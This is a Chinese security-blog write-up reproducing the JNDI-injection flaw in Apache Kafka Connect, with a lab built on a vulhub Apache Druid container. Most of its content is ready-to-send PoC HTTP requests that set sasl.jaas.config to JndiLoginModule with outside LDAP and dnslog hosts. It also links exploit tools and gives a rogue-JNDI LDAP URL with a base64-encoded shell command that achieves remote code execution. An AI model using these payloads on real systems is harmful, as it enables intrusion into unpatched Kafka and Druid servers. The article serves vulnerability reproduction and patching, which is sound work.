<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4qEuU9G3mU5ZNea-_SkVPQ)

  

网安引领时代，弥天点亮未来 

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x00 写在前面**  

  

**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x01 漏洞介绍**  

Apache Kafka 是美国阿帕奇（Apache）基金会的一套开源的分布式流媒体平台。该平台能够获取实时数据，用于构建对数据流的变化进行实时反应的应用程序。
================================================================================

在 Apache Kafka Connect 中存在 JNDI 注入漏洞，当攻击者可访问 Kafka Connect Worker，且可以创建或修改连接器时，通过设置 sasl.jaas.config 属性为 com.sun.security.auth.module.JndiLoginModule，进而可导致 JNDI 注入，造成 RCE 需低版本 JDK 或目标 Kafka Connect 系统中存在利用链。

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x02 影响版本**  

  

2.3.0 <= Apache Kafka <= 3.3.2

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBLJATGrzibqzYSicFRNa6lGsFoPibIClicUtGJQZ94icrTZdgiabKUBpAA2M2BFgDkNKaXFVR30YdLZyNg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x03 漏洞复现**  

  

1.docker 部署漏洞环境

```
docker pull  vulhub/apache-druid:25.0.0
docker run -d -p 8888:8888  vulhub/apache-druid:25.0.0

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBLJATGrzibqzYSicFRNa6lGsVmm0biaXwOIXZwrwMHvyh1ANRXGwAEGpZJ0ynNjeibYZ8AqIUytYcm4g/640?wx_fmt=png)

2. 对漏洞进行复现

 **Poc1 （POST）**

```
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: 192.168.86.6:8888
Content-Length: 1400
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: pZaf_2132_ulastactivity=050484OuqAxDqETcOja26QKgFkE4HbrlSk4NbAkGRg9oNLIbkCUN; pZaf_2132_nofavfid=1; pZaf_2132_smile=1D1; pZaf_2132_home_readfeed=1682214968; pZaf_2132_lastviewtime=1%7C1682215445; pZaf_2132_lastcheckfeed=1%7C1682217817; kOJf_2132_saltkey=MGWItu8r; kOJf_2132_lastvisit=1683339017; kOJf_2132_ulastactivity=27e4qsFumyqDRGo03vcLLEHChJmZRharD1jfbUJnU1NIIIrbB8UL; kOJf_2132_nofavfid=1; kOJf_2132_lastcheckfeed=1%7C1683342726; PHPSESSID=3543e022151ed94117e84216
Connection: close
{
    "type":"kafka",
    "spec":{
        "type":"kafka",
        "ioConfig":{
            "type":"kafka",
            "consumerProperties":{
                "bootstrap.servers":"127.0.0.1:6666",
                "sasl.mechanism":"SCRAM-SHA-256",
                "security.protocol":"SASL_SSL",
                "sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://sdaiovzrny.dnstunnel.run\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
            },
            "topic":"test",
            "useEarliestOffset":true,
            "inputFormat":{
                "type":"regex",
                "pattern":"([\\s\\S]*)",
                "listDelimiter":"56616469-6de2-9da4-efb8-8f416e6e6965",
                "columns":[
                    "raw"
                ]
            }
        },
        "dataSchema":{
            "dataSource":"sample",
            "timestampSpec":{
                "column":"!!!_no_such_column_!!!",
                "missingValue":"1970-01-01T00:00:00Z"
            },
            "dimensionsSpec":{
            },
            "granularitySpec":{
                "rollup":false
            }
        },
        "tuningConfig":{
            "type":"kafka"
        }
    },
    "samplerConfig":{
        "numRows":500,
        "timeoutMs":15000
    }
}

```

漏洞复现

POST 请求，响应存在漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBLJATGrzibqzYSicFRNa6lGscCb8vzZF4eiaXibyFhWXdwthIjGx56fpMdEEPsuMAqwib3s1G6ibXbjXUw/640?wx_fmt=png)

        Yakit 生成测试域名

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBLJATGrzibqzYSicFRNa6lGsS6BkX5zANtCRmHv5KKnSTczDZeIzx2MbDzsCWr0wNdrGRXHgkYCfHw/640?wx_fmt=png)

        DNSlog 生成测试域名

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBLJATGrzibqzYSicFRNa6lGsxLOiaib72KETTQgRf1PXKb8wLIicMTd7VGSI8vD0WuPBYcbiclc8ZRvl3w/640?wx_fmt=png)

**Poc2 （POST）**

```
POST /connectors HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
Content-Length: 809
{
    "name": "mysql-connect",
    "config": {
        "connector.class": "io.debezium.connector.mysql.MySqlConnector",
        "database.hostname": "192.168.2.135",
        "database.port": "3306",
        "database.user": "root",
        "database.password": "root",
        "database.server.id": "316545017",
        "database.server.name": "test1",
        "database.history.kafka.bootstrap.servers": "192.168.2.135:9092",
        "database.history.kafka.topic": "quickstart-events",    "database.history.producer.security.protocol": "SASL_SSL",
        "database.history.producer.sasl.mechanism": "PLAIN",
        "database.history.producer.sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://93plro.dnslog.cn\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
    }
}

```

POST 请求，响应存在漏洞，dnslog 域名测试

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBLJATGrzibqzYSicFRNa6lGsI2pNz6C13pBibzLjEWP8wxvCLjX8DEMx60aThzibPibiboYkibVxQUdwR3A/640?wx_fmt=png)

3.jndi 的工具生成 payload 进行命令执行，

工具下载地址：

```
https://github.com/vulhub/JNDIExploit

```

启动 jndi 漏洞利用链  

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBLJATGrzibqzYSicFRNa6lGsnY2UsLfuIxQUhgxicphUWvDgiczZpOXVb1zOQl8gPODTTFuaTeL8uUsA/640?wx_fmt=png)

脚本进行命令执行  

```
https://github.com/Avento/Apache_Druid_JNDI_Vuln

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBLJATGrzibqzYSicFRNa6lGscjibBfdKicuInhictLZXBZAo9UhvY87xZ5uJnzR12joHa46u0TCQFsoUA/640?wx_fmt=png)

命令执行成功

```
ldap://roguo-jndi-server:1389/Basic/Command/base64/aWQgPiAvdG1wL3N1Y2Nlc3M=

```

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hBLJATGrzibqzYSicFRNa6lGs2UY95CW0MoWQ21cusJmOh4pBGWqGjcg26DrGo0Dic7lia6UtOIVyp0fw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**0x04 修复建议**  

  

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

```
https://lists.apache.org/thread/vy1c7fqcdqvq5grcqp6q5jyyb302khyz

```

弥天简介

学海浩茫，予以风动，必降弥天之润！弥天弥天安全实验室成立于 2019 年 2 月 19 日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。

口号 网安引领时代，弥天点亮未来

![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 

知识分享完了

喜欢别忘了关注我们哦~

学海浩茫，

予以风动，

必降弥天之润！

   弥  天

安全实验室  

![](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)